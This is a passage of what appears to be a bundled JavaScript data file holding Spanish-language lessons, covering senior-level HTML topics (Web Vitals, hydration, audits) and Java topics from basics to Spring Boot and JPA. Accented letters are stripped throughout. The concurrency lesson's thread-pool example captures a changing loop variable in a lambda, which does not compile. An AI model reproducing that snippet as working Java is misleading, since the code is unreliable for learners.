`,completed:!1},{id:"html-senior-html-performance",title:"HTML y Performance (Web Vitals)",level:"senior",content:'# Leccin 22: HTML y Performance (Web Vitals)\n\n## 1. Critical Rendering Path\n\nEl navegador detiene el pintado (Render Blocking) cuando encuentra CSS o JS sncrono en el `<head>`.\nTu trabajo es organizar el HTML para que el usuario vea algo lo antes posible (First Contentful Paint).\n\n## 2. Resource Hints\n\nInstrucciones al navegador para anticiparse.\n\n*   `rel="preconnect"`: "Navegador, vamos a pedir datos a `api.misitio.com`, ve haciendo el handshake DNS/TCP/TLS ya".\n*   `rel="preload"`: "Este recurso (fuente woff2, imagen hero) es CRTICO. Descrgalo con alta prioridad antes de que el parser lo encuentre".\n*   `rel="prefetch"`: "Probablemente el usuario vaya a la pgina `/contacto`, descrgala en segundo plano (low priority)".\n\n```html\n<link rel="preconnect" href="https://fonts.googleapis.com">\n<link rel="preload" href="/fonts/mi-fuente.woff2" as="font" type="font/woff2" crossorigin>\n```\n\n## 3. CLS (Cumulative Layout Shift)\n\nSi tus imgenes no tienen dimensiones en el HTML, el navegador no reserva espacio. Cuando la imagen carga, empuja el texto hacia abajo. Esto es CLS y Google te penaliza severamente.\n\n**Solucin Senior:**\nSiempre, SIEMPRE atributos `width` y `height` en `<img>` e `<iframe>`. El navegador usa estos ratios para aspect-ratio CSS automtico.\n\n```html\n<!-- El navegador reserva un cuadro de 800x600 antes de bajar 1 bit de la imagen -->\n<img src="foto.jpg" width="800" height="600" alt="...">\n```\n\n## 4. Decodificacin de Imgenes\n\n```html\n<img src="..." decoding="async">\n```\nLe dice al navegador que decodifique la imagen fuera del hilo principal para no congelar el scroll.\n',completed:!1},{id:"html-senior-spa-ssr-hydration",title:"HTML en la Era Moderna (SPA, SSR, Hydration)",level:"senior",content:`# Leccin 23: HTML en la Era Moderna (SPA, SSR, Hydration)

## 1. El Valle Inquietante de la Hidratacin

En frameworks como Next.js o Remix, el servidor enva HTML puro (SSR). Luego, React "hidrata" ese HTML (le pega los eventos JS).
**El error:** Si tu HTML es invlido, la hidratacin falla y la UI colapsa o parpadea.

## 2. Errores de Anidacin Prohibidos

El navegador intenta corregir tu HTML *antes* de que React tome el control. Si React espera una estructura y encuentra otra (porque el navegador la arregl), BOOM: Hydration Error.

**Caso Clsico:**
\`\`\`html
<p>
  <div>Soy un div ilegal dentro de un p</div>
</p>
\`\`\`
*El navegador cerrar el \`<p>\` automticamente antes del \`<div>\`. React buscar el div DENTRO del p y no lo encontrar.*

**Otros casos prohibidos:**
*   \`<a>\` dentro de \`<a>\`.
*   \`<form>\` dentro de \`<form>\`.
*   \`<ul>\` dentro de \`<p>\`.

## 3. Streaming HTML

Lo ltimo en arquitectura. Enviar el HTML por pedazos.
El servidor enva el \`<head>\` y el esqueleto del \`<body>\` inmediatamente, y deja abierta la conexin para enviar los datos ms pesados despus.
Tu HTML debe ser robusto para soportar llegar incompleto visualmente y rellenarse.

## 4. Progressive Enhancement

Construye tu funcionalidad bsica con HTML (links \`href\`, forms \`action\`). Luego mejora con JS (AJAX, transiciones).
Si el JS falla (pasa a menudo en redes mviles), tu sitio HTML estndar sigue funcionando.
Esto diferencia a un Senior de un "React Developer".
`,completed:!1},{id:"html-senior-errores-produccion",title:"Errores Estructurales en Produccin",level:"senior",content:`# Leccin 24: Errores Estructurales en Produccin

## 1. IDs Duplicados en Loops

El error ms comn en React/Vue/Angular.
Generar una lista de elementos y ponerles \`id="boton-borrar"\`.
Resultado: HTML invlido. \`document.getElementById\` solo devuelve el primero. Los lectores de pantalla fallan al asociar labels.

## 2. Botones sin \`type\`

Dentro de un \`<form>\`, cualquier \`<button>\` es \`type="submit"\` por defecto.
Si tienes un botn "Cancelar" o "Siguiente paso" dentro de un form y no le pones \`type="button"\`, al hacer clic **enviar el formulario**.

\`\`\`html
<form>
    <!-- Esto enva el form y recarga la pgina por error -->
    <button>Cancelar</button> 
    
    <!-- Esto es correcto -->
    <button type="button">Cancelar</button>
</form>
\`\`\`

## 3. Olvidar el atributo \`lang\` dinmico

En sitios multi-idioma, cambiar el contenido con JS sin cambiar \`<html lang="...">\` hace que los sintetizadores de voz lean espaol con acento ingls (o viceversa).

## 4. Headings por Esttica

Usar \`<h5>\` para un texto legal en el footer porque "se ve del tamao correcto".
**Solucin Senior:** Usa \`<p class="legal-text">\` y ajusta el tamao con CSS. Mantn la semntica pura.
`,completed:!1},{id:"html-senior-auditoria-real",title:"Auditora Real (Desafo Senior)",level:"senior",content:`# Leccin 25: Auditora Real (Desafo Senior)

## Objetivo
Realizar una auditora forense del HTML de un sitio en produccin.

## Herramientas
1.  **View Source (Ctrl+U):** Ver el HTML crudo que llega del servidor.
2.  **Inspect Element (F12):** Ver el DOM vivo (ya manipulado por JS y el navegador).
3.  **Lighthouse / Axe:** Auditora automatizada.
4.  **W3C Validator:** La prueba de la verdad.

## El Desafo

Toma un sitio popular (ej: un e-commerce local o sitio de noticias).

1.  **Busca "Div-itis":** Encuentra un componente que podra haber sido \`<article>\` o \`<section>\`.
2.  **Prueba de Teclado:** Intenta navegar todo el sitio sin mouse. Ves dnde est el foco? Puedes abrir los mens desplegables? Si no, falta HTML semntico (\`<button>\` vs \`div\`) o \`tabindex\`.
3.  **Prueba de Zoom:** Haz zoom al 200%. Se rompe el contenido? (Problema de \`meta viewport\` o CSS, pero a veces HTML rgido).
4.  **Verificacin de Outline:** Usa una extensin para ver la estructura de H1-H6. Tiene sentido lgica o saltan de H1 a H4?

## Entrega (Mental)
Como Senior, tu trabajo es detectar estos fallos en Code Reviews ANTES de que lleguen a produccin. Tu "Sensei" interno debe activarse cada vez que veas un \`div onclick\`.
`,completed:!1},{id:"html-senior-spa-antipatterns",title:"HTML en SPAs y Anti-patrones Modernos",level:"senior",objective:"Evitar la degradacin de la web moderna recuperando las bases del HTML en entornos controlados por JavaScript.",explanation:'En el desarrollo moderno con frameworks (React, Vue, Angular), es comn olvidar que el resultado final sigue siendo HTML. El anti-patrn ms peligroso es la "Hydration Mismatch" (cuando el HTML del servidor no coincide con el del cliente). Tambin analizamos la "Div-itis" moderna causada por los wrappers de componentes y cmo afecta a la accesibilidad y a la memoria del navegador.',examples:[`/* Anti-patrn: Wrapper innecesario */
const MyComponent = () => (
  <div> {/* Es necesario este div si ya tenemos una estructura semntica fuera? */}
    <article>...</article>
  </div>
);

/* Solucin: React Fragments o etiquetas semnticas directas */
const BetterComponent = () => (
  <article>...</article>
);`],commonMistakes:["Depender 100% de JS para el renderizado, rompiendo la funcionalidad bsica cuando el script falla o se bloquea.","Uso incorrecto de IDs duplicados al reutilizar componentes en un mismo rbol DOM.","Re-inventar comportamientos de formularios HTML nativos con JS, perdiendo validaciones automticas y accesibilidad de teclado."],bestPractices:["Utiliza Fragments o `<>` en tu framework para evitar contaminar el DOM con nodos de posicionamiento.",'Sigue el principio de "Progressive Enhancement": que la web sea usable (aunque sea bsica) sin JavaScript.','Delega en el navegador siempre que sea posible (ej. usa input type="date" en lugar de una librera pesada de JS).'],exercises:['Debug: Soluciona un "Hydration Mismatch" en un componente complejo causado por un HTML invlido generado en el servidor.',"Refactoring: Elimina el 50% de los nodos DOM de una landing page compleja sin alterar su diseo visual, optimizando el uso de wrappers en el framework.","Decisin Tcnica: Evala si usar un Custom Element nativo o un componente de React para un widget que debe insertarse en mltiples proyectos con diferentes tecnologas."],extraNotes:"El Shadow DOM es una herramienta poderosa pero peligrosa. Un senior debe saber cundo usarlo para aislar estilos y cundo el Light DOM es preferible para mantener la accesibilidad global y la integracin con herramientas de terceros.",completed:!1},{id:"html-eval-senior",title:"Evaluacin Final: Nivel Senior",level:"senior",content:`# Evaluacin de Competencias: HTML Senior

Esta evaluacin mide tu dominio de la arquitectura, rendimiento y estndares web avanzados.

## Seccin 1: Preguntas de Arquitectura y Performance

1.  **Explica el Critical Rendering Path y cmo el orden de las etiquetas en el \`<head>\` afecta al rendimiento (LCP/FCP).**
2.  **Qu impacto tiene la profundidad del DOM (DOM Depth) en el rendimiento de pintado y memoria?**
3.  **Describe una estrategia de "Progressive Enhancement" para un componente de Tabs.**
4.  **Cmo gestionaras el SEO de una Single Page Application (SPA) que renderiza todo el contenido con JavaScript en el cliente?**
5.  **Analiza los pros y contras de usar Shadow DOM (\`<slot>\`) vs Light DOM en una librera de componentes corporativa.**

## Seccin 2: Auditora Tcnica

Analiza el siguiente fragmento HTML "moderno" y enumera al menos **4 problemas graves** relacionados con accesibilidad, SEO o validacin.

\`\`\`html
<section onclick="location.href='/producto/123'" role="button">
    <div class="h1-style">Zapatillas Nike</div>
    <img src="zapatilla.jpg" alt="foto" loading="lazy" />
    <a href="#">
        <div class="btn-comprar">Comprar</div>
    </a>
</section>
\`\`\`

## Seccin 3: Desafo de Arquitectura

Disea (pseudo-cdigo o HTML esquemtico) la estructura del \`<head>\` perfecto para la **Home Page de un portal de noticias internacional** de alto trfico.
Debes considerar:
1.  Precarga de recursos crticos (fuentes, imagen principal LCP).
2.  SEO Tcnico y Social (Open Graph, Twitter).
3.  Internacionalizacin (Hreflang).
4.  Seguridad (CSP bsico).
5.  Paginacin o canonicals si aplica.

## Criterios de Aprobacin

*   [ ] Capacidad de justificar decisiones tcnicas basndose en mtricas (Web Vitals).
*   [ ] Identificacin precisa de anti-patrones de accesibilidad (divs interactivos).
*   [ ] Conocimiento profundo de especificaciones modernas (Preload, CSP, Microdata).
*   [ ] Enfoque en escalabilidad y mantenibilidad del cdigo.
`,completed:!1,isProject:!0}]},ov={id:"java",title:"Java Empresarial",description:"El estndar de la industria para sistemas robustos, escalables y seguros. Domina la JVM y el desarrollo Orientado a Objetos.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"java-01-intro-java",title:"Qu es Java y la JVM?",level:"junior",content:`# Leccin 01: Qu es Java y la JVM?

**Java** es el estndar de oro del desarrollo empresarial. Si un sistema debe ser robusto, escalar a millones de usuarios y mantenerse por dcadas, probablemente est hecho en Java.

## 1. "Write Once, Run Anywhere"
Java no compila directamente a cdigo de mquina (como C++), ni es interpretado lnea por lnea (como Python).
Java compila a **Bytecode** (\`.class\`).

Este Bytecode corre sobre la **JVM (Java Virtual Machine)**.
*   Si instalas la JVM en Windows, tu cdigo corre en Windows.
*   Si instalas la JVM en Linux, tu MISMO cdigo corre en Linux.
*   No necesitas recompilar nada!

## 2. JDK, JRE y JVM
*   **JVM:** La mquina virtual.
*   **JRE (Java Runtime Environment):** JVM + Libreras para ejecutar apps.
*   **JDK (Java Development Kit):** JRE + Compilador (\`javac\`) para desarrollar apps.

## 3. Estructura Bsica
En Java, **TODO** debe estar dentro de una clase.
\`\`\`java
public class HolaMundo {
    public static void main(String[] args) {
        System.out.println("Hola Mundo desde Java!");
    }
}
\`\`\`
*   \`public class HolaMundo\`: Define la clase. El archivo debe llamarse \`HolaMundo.java\`.
*   \`public static void main\`: Es el punto de entrada. Aqu empieza todo.

---

### Concepto Junior:
Java es un lenguaje **Fuertemente Tipado** y **Esttico**. Debes declarar el tipo de cada variable antes de usarla, y no puedes cambiarlo despus.
`,completed:!1},{id:"java-02-tipos-datos-envoltorio",title:"Tipos de Datos (Primitivos vs Objetos)",level:"junior",content:'# Leccin 02: Tipos de Datos (Primitivos vs Objetos)\n\nEn Java, no todo es un objeto. Existen los **Tipos Primitivos**.\n\n## 1. Primitivos (8 tipos)\nSon los valores bsicos. Ocupan memoria fija y son muy rpidos.\n*   **Enteros:** `byte`, `short`, `int` (el ms usado), `long`.\n*   **Decimales:** `float`, `double` (el ms usado).\n*   **Caracteres:** `char` (solo una letra con comillas simples \'A\').\n*   **Booleanos:** `boolean` (true/false).\n\n```java\nint edad = 30;\ndouble precio = 99.99;\nboolean esValido = true;\n```\n\n## 2. Strings (Clases)\n`String` **NO es un tipo primitivo**, es una **Clase** (Objeto). Por eso `String` empieza con mayscula.\n```java\nString nombre = "Octavio"; // Comillas dobles\n```\n\n## 3. Clases Envoltorio (Wrapper Classes)\nA veces necesitamos tratar primitivos como objetos (por ejemplo, para meterlos en una Lista).\n*   `int` -> `Integer`\n*   `double` -> `Double`\n*   `boolean` -> `Boolean`\n\nEstas clases nos dan mtodos tiles:\n```java\nint maximo = Integer.MAX_VALUE; // 2147483647\nString numeroTexto = Integer.toString(123);\n```\n\n---\n\n### Misin Junior:\nNunca compares dos Strings con `==`. Eso compara **referencias de memoria** (si son el mismo objeto), no el contenido.\n*   **MAL:** `if (nombre == "Ana")`\n*   **BIEN:** `if (nombre.equals("Ana"))`\n',completed:!1},{id:"java-03-control-flujo-bucles",title:"Estructuras de Control (If, While, For)",level:"junior",content:`# Leccin 03: Estructuras de Control (If, While, For)

La lgica del programa es como un semforo.

## 1. Condicionales (if, else if, else)
Similar a C# y JS. Recuerda que no existe el "Truthiness" como en JS (donde \`"Hola"\` es true). La condicin DEBE ser un booleano.
\`\`\`java
int edad = 18;
if (edad >= 18) {
    System.out.println("Mayor de edad");
} else {
    System.out.println("Menor de edad");
}
\`\`\`

## 2. Switch
Para evitar mltiples \`if-else\` cuando comparas una sola variable.
\`\`\`java
int dia = 3;
switch (dia) {
    case 1:
        System.out.println("Lunes");
        break; // Importante
    case 5:
        System.out.println("Viernes");
        break;
}
\`\`\`

## 3. Bucles (While, Do-While, For)
### While
Se ejecuta mientras la condicin sea true.
\`\`\`java
int i = 0;
while (i < 5) {
    System.out.println(i);
    i++;
}
\`\`\`

### For (Iteracin)
Mejor para recorrer arrays.
\`\`\`java
for (int i = 0; i < 5; i++) {
    System.out.println("Iteracin: " + i);
}
\`\`\`

### For-Each (Enhanced For)
La forma moderna de iterar Colecciones.
\`\`\`java
int[] numeros = {1, 2, 3};
for (int num : numeros) {
    System.out.println(num);
}
\`\`\`

---

### Misin Junior:
Nunca olvides el \`break\` en un \`switch\`. Si lo olvidas, Java seguir ejecutando los casos de abajo (Casos "Fall-through").
`,completed:!1},{id:"java-04-metodos-alcance",title:"Mtodos y Alcance (Scoping)",level:"junior",content:`# Leccin 04: Mtodos y Alcance (Scoping)

Un mtodo es una funcin que pertenece a una clase.

## 1. Definicin Bsica (Public, Static, Void)
\`\`\`java
// Modificador | Esttico? | Retorno | Nombre | Argumentos
public static int sumar(int a, int b) {
    return a + b;
}
\`\`\`
*   **public:** Se puede acceder desde cualquier parte.
*   **static:** No necesitas crear una instancia (\`new Calculadora()\`) para llamarlo. \`Calculadora.sumar(5, 5)\`.
*   **int:** Tipo de dato que **devuelve**. Si no devuelve nada, usa \`void\`.

## 2. Parmetros y Valores (Pass-by-Value)
Java siempre pasa los valores por **copia**.
\`\`\`java
void cambiar(int x) {
    x = 10;
}
int a = 5;
cambiar(a);
System.out.println(a); // Sigue siendo 5
\`\`\`
Pero cuidado con los Objetos (Arrays, Lists, Classes):
\`\`\`java
void cambiarArray(int[] arr) {
    arr[0] = 99; // Modifica el array original
}
\`\`\`
Aqu pasas "la copia de la referencia", as que s puedes cambiar el contenido del objeto.

## 3. Sobrecarga de Mtodos (Overloading)
En Java, puedes tener dos mtodos con el mismo nombre si tienen diferentes argumentos.
\`\`\`java
int sumar(int a, int b) { ... }
double sumar(double a, double b) { ... }
\`\`\`
Java elige el correcto automticamente.

---

### Misin Junior:
Define siempre el tipo de retorno correctamente. Si prometes devolver un \`int\`, no puedes hacer \`return "Texto";\` (Error de compilacin).
`,completed:!1},{id:"java-05-clases-basicas-poo",title:"Clases y Objetos Bsicos (POO)",level:"junior",content:`# Leccin 05: Clases y Objetos Bsicos (POO)

"Todo en Java es un objeto". Ya es hora de que uses ese poder.

## 1. Clases vs Objetos
*   **Clase (El Molde):** \`class Coche\`. Define que todo coche tiene \`color\` y \`velocidad\`.
*   **Objeto (El Resultado):** \`new Coche()\`. El "Ferrari rojo" es una instancia real.

## 2. Atributos (Variables de Instancia)
\`\`\`java
public class Coche {
    String marca;
    String modelo;
    int ao;
    
    // Mtodo Constructor (Mismo nombre que la Clase)
    public Coche(String marca, String modelo, int ao) {
        this.marca = marca;
        this.modelo = modelo;
        this.ao = ao;
    }
}
\`\`\`
*   \`this\`: Se refiere al objeto actual (\`this.marca\` es el atributo del objeto, \`marca\` es el argumento).
*   **Constructor:** Se llama automticamente al crear el objeto (\`new Coche(...)\`).

## 3. Mtodos de Instancia
\`\`\`java
// Dentro de la clase Coche
public void encender() {
    System.out.println("El " + this.modelo + " est encendido.");
}
\`\`\`
Ahora podemos usarlo:
\`\`\`java
Coche miAuto = new Coche("Ford", "Fiesta", 2020);
miAuto.encender();
\`\`\`

---

### Misin Junior:
Aprender la visibilidad:
*   \`public\`: Visible para todo el mundo.
*   \`private\`: Solo visible DENTRO de la clase. (Recomendado para atributos).
*   \`protected\`: Visible para clases del mismo paquete y subclases.
`,completed:!1},{id:"java-06-practica-junior",title:"Prctica Java Junior: El Sistema de Biblioteca Escolar",level:"junior",content:'# Prctica Java Junior: El Sistema de Biblioteca Escolar\n\nHora de picar cdigo (bueno, al menos en tu mente o en IntelliJ)!\n\n---\n\n## 1. El Libro (Clase)\nCrea una clase `Libro` con:\n*   Atributos: `titulo` (String), `autor` (String), `paginas` (int), `prestado` (boolean).\n*   Constructor que reciba `titulo`, `autor` y `paginas`. Por defecto, `prestado` es false.\n*   Mtodo `toString()` que devuelva el ttulo y autor (ej: "1984 por George Orwell").\n\n## 2. La Biblioteca (Main)\nEn el mtodo `main`:\n1.  Crea un array de 3 libros.\n2.  Itera sobre los libros con un bucle `for-each`.\n3.  Imprime solo los libros que tengan ms de 300 pginas.\n\n## 3. Reto: Prestar Libros\n*   Agrega un mtodo `prestar()` a la clase `Libro`.\n    *   Si ya est prestado (`if (this.prestado)`), imprime "Ya prestado".\n    *   Si no, cambia `this.prestado = true` e imprime "Prestado con xito".\n*   Intenta prestar el mismo libro dos veces en el `main` y verifica que funcione.\n\n---\n\n### Misin:\nUn programador Java debe saber encapsular datos en objetos. No tengas variables sueltas (`titulo1`, `titulo2`, `titulo3`). Ten un objeto `Libro`.\n',completed:!1,isProject:!0},{id:"java-07-encapsulamiento",title:"Encapsulamiento (Getters y Setters)",level:"junior",content:`# Leccin 07: Encapsulamiento (Getters y Setters)

No dejes que nadie toque tus datos si no es con permiso.

## 1. El modificador \`private\`
\`\`\`java
public class CuentaBancaria {
    private double saldo; // Nadie puede hacer miCuenta.saldo = 1000000;
}
\`\`\`

## 2. Getters y Setters (Acceso Controlado)
Para leer y escribir el saldo, creamos mtodos pblicos.
\`\`\`java
public double getSaldo() {
    return this.saldo;
}

public void depositar(double monto) {
    if (monto > 0) {
        this.saldo += monto;
    }
}
\`\`\`
As garantizamos que nadie pueda depositar montos negativos.

## 3. JavaBeans
Es una convencin: Atributos privados, constructor vaco, getters y setters pblicos. Esto lo usan muchos frameworks (Spring, Hibernate).

---

### Misin Junior:
En IntelliJ IDEA o Eclipse, puedes generar Getters y Setters automticamente (Click derecho -> Generate). No los escribas a mano!
`,completed:!1},{id:"java-08-herencia-polimorfismo",title:"Herencia (extends) y Polimorfismo",level:"junior",content:`# Leccin 08: Herencia (extends) y Polimorfismo

No reescribas cdigo. Hereda lo que ya existe.

## 1. La palabra clave \`extends\`
\`\`\`java
public class Animal {
    public void comer() {
        System.out.println("Comiendo...");
    }
}

public class Gato extends Animal {
    public void maullar() {
        System.out.println("Miau");
    }
}
\`\`\`
Ahora el Gato puede \`maullar()\` y tambin \`comer()\`.

## 2. Sobreescritura (Override)
A veces el hijo hace lo mismo que el padre, pero a su manera.
\`\`\`java
@Override
public void comer() {
    System.out.println("Comiendo pescado...");
}
\`\`\`
*   \`@Override\`: Es una anotacin que le dice al compilador "Oye, revisa que realmente est sobreescribiendo algo de la clase padre".

## 3. Polimorfismo (La magia)
Podemos tratar a un Gato como un Animal.
\`\`\`java
Animal miMascota = new Gato();
miMascota.comer(); // Ejecuta el mtodo comer() del Gato (Comiendo pescado...)
\`\`\`
Esto permite tener una lista \`List<Animal>\` con Gatos, Perros y Pjaros, y llamar a \`.comer()\` en todos sin saber qu son exactamente.

---

### Misin Junior:
En Java solo puedes extender de **UNA** clase (\`extends Animal\`), no de varias (no existe herencia mltiple de clases). Pero puedes implementar muchas Interfaces.
`,completed:!1},{id:"java-09-colecciones",title:"Colecciones (ArrayList, HashSet, HashMap)",level:"semi-senior",content:`# Leccin 09: Colecciones (ArrayList, HashSet, HashMap)

Hasta ahora hemos usado arrays estticos (\`int[]\`). Pero en la vida real, los datos crecen y se encogen. El Framework de Colecciones es tu mejor amigo.

## 1. Listas (\`List\` y \`ArrayList\`)
Una lista ordenada que permite duplicados y crece dinmicamente.
\`\`\`java
import java.util.ArrayList;
import java.util.List;

List<String> nombres = new ArrayList<>();
nombres.add("Ana");
nombres.add("Luis");
System.out.println(nombres.get(0)); // Ana
\`\`\`

## 2. Conjuntos (\`Set\` y \`HashSet\`)
No permite duplicados y no garantiza orden.
\`\`\`java
Set<Integer> numeros = new HashSet<>();
numeros.add(1);
numeros.add(1); // Ignorado
System.out.println(numeros.size()); // 1
\`\`\`

## 3. Mapas (\`Map\` y \`HashMap\`)
Pares Clave-Valor. Como un Diccionario en Python o un Objeto en JS.
\`\`\`java
Map<String, Integer> edades = new HashMap<>();
edades.put("Ana", 30);
edades.put("Luis", 25);

if (edades.containsKey("Ana")) {
    System.out.println("Edad de Ana: " + edades.get("Ana"));
}
\`\`\`

---

### Misin Semi-Senior:
Distingue entre la **Interfaz** (\`List\`) y la **Implementacin** (\`ArrayList\`).
Siempre declara usando la interfaz: \`List<String> x = new ArrayList<>();\`
Esto te permite cambiar \`ArrayList\` por \`LinkedList\` despus sin romper todo el cdigo.
`,completed:!1},{id:"java-10-genericos",title:"Genricos (Generics)",level:"semi-senior",content:`# Leccin 10: Genricos (Generics)

Por qu escribimos \`List<String>\` y no solo \`List\`? Eso es un Genrico.

## 1. El problema del "Raw Type"
Antes de Java 5, las listas eran de \`Object\`.
\`\`\`java
List lista = new ArrayList();
lista.add("Texto");
// Haba que castear manualmente. Peligroso.
String s = (String) lista.get(0);
\`\`\`

## 2. La solucin (\`<T>\`)
Definimos que la lista solo acepta Strings.
\`\`\`java
List<String> lista = new ArrayList<>();
lista.add("Texto");
// No hace falta casting
String s = lista.get(0);
// lista.add(123); // ERROR de compilacin. Seguridad de tipos!
\`\`\`

## 3. Clases Genricas propias
Puedes crear tus propias clases flexibles.
\`\`\`java
public class Caja<T> {
    private T contenido;

    public void guardar(T objeto) {
        this.contenido = objeto;
    }

    public T sacar() {
        return this.contenido;
    }
}

Caja<Integer> cajaDeNumeros = new Caja<>();
cajaDeNumeros.guardar(10);
\`\`\`

---

### Misin Semi-Senior:
Los Genricos existen solo en tiempo de compilacin. En runtime, Java borra el tipo (Type Erasure) para mantener compatibilidad con versiones viejas. Entender esto es clave cuando depuras errores raros de reflexin.
`,completed:!1},{id:"java-11-java8-lambdas",title:"Java 8 (Lambdas y Streams)",level:"semi-senior",content:`# Leccin 11: Java 8 (Lambdas y Streams)

Java dej de ser un lenguaje verboso en 2014 con Java 8.

## 1. Expresiones Lambda
Son funciones annimas que hacen el cdigo ms limpio.
\`\`\`java
// Forma antigua (Clase annima)
new Thread(new Runnable() {
    @Override
    public void run() {
        System.out.println("Hola");
    }
}).start();

// Forma nueva (Lambda)
new Thread(() -> System.out.println("Hola")).start();
\`\`\`

## 2. API Stream (Programacin Funcional)
Procesar colecciones como un flujo de datos.
\`\`\`java
List<String> nombres = Arrays.asList("Ana", "Luis", "Pedro", "Alba");

// Filtrar nombres que empiezan con A y convertirlos a maysculas
List<String> resultado = nombres.stream()
    .filter(name -> name.startsWith("A"))
    .map(name -> name.toUpperCase())
    .collect(Collectors.toList());

// Resultado: ["ANA", "ALBA"]
\`\`\`
Sin \`for-each\`, sin \`if\`, sin variables temporales. Pura elegancia declarativa.

## 3. Operations (Intermediate vs Terminal)
*   **Intermedia:** \`filter\`, \`map\`, \`sorted\`. No ejecutan nada, solo configuran el pipeline.
*   **Terminal:** \`collect\`, \`forEach\`, \`count\`. Disparan la ejecucin. Si olvidas la operacin terminal, el Stream no hace nada.

---

### Misin Semi-Senior:
Aprender a usar \`Optional<T>\` para evitar el temido \`NullPointerException\`.
\`\`\`java
Optional<String> nombre = Optional.ofNullable(null);
System.out.println(nombre.orElse("Desconocido")); // Imprime "Desconocido"
\`\`\`
`,completed:!1},{id:"java-12-practica-semi-senior",title:"Prctica Java Semi-Senior: El Analizador de Logs",level:"semi-senior",content:`# Prctica Java Semi-Senior: El Analizador de Logs

Demuestra que dominas las Colecciones, los Streams y la Programacin Funcional.

---

## 1. El Parseador de Logs (Collections + Streams)
**Consigna:** Tienes una lista de Strings que representan logs:
\`\`\`java
List<String> logs = Arrays.asList(
    "2023-01-01 10:00:00 INFO Inicio de sistema",
    "2023-01-01 10:05:00 ERROR NullPointerException",
    "2023-01-01 10:10:00 INFO Proceso terminado",
    "2023-01-01 10:15:00 ERROR DatabaseConnectionException"
);
\`\`\`
1.  Filtra los logs que sean de tipo "ERROR".
2.  Extrae solo el mensaje de error (quitando la fecha y el nivel de severidad).
3.  Cuenta cuntos errores nicos ocurrieron (usa \`.distinct().count()\`).

## 2. El Mapa de Frecuencias (Map + Generics)
**Consigna:** Crea una funcin genrica \`Contador<T>\` que reciba una lista de objetos \`List<T>\` y devuelva un \`Map<T, Integer>\` con la frecuencia de cada elemento.
*   Ejemplo: \`["A", "B", "A", "C"]\` -> \`{"A": 2, "B": 1, "C": 1}\`.
*   Usa el mtodo \`.getOrDefault\` del Map para simplificar la lgica.

## 3. Reto de Excepciones
**Consigna:**
*   Crea una excepcin personalizada \`InvalidLogException\`.
*   Crea un mtodo que analice un log y lance esta excepcin si el formato no es vlido (ej: no contiene la palabra "INFO" o "ERROR").
*   Maneja la excepcin con \`try-catch\` e imprime un mensaje amigable.

---

### Resultado esperado:
Cdigo limpio, uso de API Stream para evitar bucles \`for\` innecesarios y manejo correcto de Tipos Genricos.
`,completed:!1,isProject:!0},{id:"java-13-concurrencia",title:"Concurrencia y Multithreading",level:"semi-senior",content:`# Leccin 13: Concurrencia y Multithreading

Java naci preparado para la concurrencia. Pero usar \`Thread\` a mano es cosa del pasado.

## 1. El problema de los Hilos Manuales
\`\`\`java
Thread t = new Thread(() -> System.out.println("Hola"));
t.start();
\`\`\`
Crear hilos es caro para el sistema operativo. Si creas 10,000 hilos, tu servidor colapsar.

## 2. ExecutorService (Pool de Hilos)
La solucin profesional. Reutiizas un grupo fijo de hilos.
\`\`\`java
ExecutorService executor = Executors.newFixedThreadPool(10); // Solo 10 obreros

for (int i = 0; i < 100; i++) {
    executor.submit(() -> System.out.println("Tarea " + i));
}
executor.shutdown();
\`\`\`

## 3. Sincronizacin (\`synchronized\`)
Cuando dos hilos tocan la misma variable a la vez, ocurre una **Condition Race**.
\`\`\`java
public synchronized void incrementar() {
    contador++; 
}
\`\`\`
Esto pone un "candado" (Lock). Solo un hilo puede entrar a este mtodo a la vez.

---

### Misin Semi-Senior:
Aprender sobre **Datos Inmutables**. Si un objeto NO puede cambiar de estado (como un \`String\`), es automticamente **Thread-Safe** sin necesidad de sincronizacin.
`,completed:!1},{id:"java-14-spring-boot-backend",title:"Backend Moderno con Spring Boot",level:"semi-senior",content:`# Leccin 14: Backend Moderno con Spring Boot

Java se comi el mundo empresarial gracias a **Spring Boot**. Es un framework opinionado que te da todo listo para produccin.

## 1. La Inversin de Control (IoC)
En lugar de hacer \`new Service()\`, le pides a Spring que te lo d.
\`\`\`java
@Service // Le dices a Spring: "T encrgate de crear esto"
public class ProductService { ... }

@RestController
public class ProductController {
    
    @Autowired // Inyeccin de Dependencias
    private ProductService service;
}
\`\`\`

## 2. API REST (Controller, Service, Repository)
*   **@RestController:** Recibe peticiones HTTP.
*   **@Service:** Contiene la lgica de negocio (validaciones, clculos).
*   **@Repository:** Habla con la base de datos (JPA).

## 3. Un Endpoint simple
\`\`\`java
@GetMapping("/productos")
public List<String> obtenerTodos() {
    return List.of("Laptop", "Mouse");
}
\`\`\`
Spring Boot convierte automticamente la lista de Java a un JSON \`["Laptop", "Mouse"]\`.

---

### Misin Backend:
Entender la diferencia entre \`@Component\` (genrico), \`@Service\` (lgica), \`@Repository\` (datos) y \`@Controller\` (web). Aunque tcnicamente hacen lo mismo (registrar el bean), semnticamente son muy distintos.
`,completed:!1},{id:"java-15-java-sql-jdbc-jpa",title:"Java y Bases de Datos (JDBC y JPA)",level:"senior",content:`# Leccin 15: Java y Bases de Datos (JDBC y JPA)

Java tiene dos formas de hablar con bases de datos: **La forma difcil (JDBC)** y **la forma de Spring (JPA)**.

## 1. JDBC (Java Database Connectivity)
Es el driver de bajo nivel. Escribes SQL puro.
\`\`\`java
Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/db", "user", "pass");
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, 5);
ResultSet rs = stmt.executeQuery();
while (rs.next()) {
    System.out.println(rs.getString("name"));
}
\`\`\`
**Pros:** Control total. **Contras:** Muy verboso. Hay que cerrar conexiones manualmente \`conn.close()\`.

## 2. JPA y Hibernate (ORM)
Java Persistence API (JPA) es la especificacin. Hibernate es la implementacin ms famosa. Mapea clases a tablas.
\`\`\`java
@Entity
@Table(name = "usuarios")
public class Usuario {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String nombre;
}
\`\`\`

## 3. Relaciones en JPA
*   \`@OneToMany\`: Un Usuario tiene muchos Pedidos.
*   \`@ManyToOne\`: Muchos Pedidos pertenecen a un Usuario.
\`\`\`java
@OneToMany(mappedBy = "usuario")
private List<Pedido> pedidos;
\`\`\`
Esto permite hacer \`usuario.getPedidos()\` y Hibernate genera el \`SELECT\` necesario automticamente.

---

### Misin Senior:
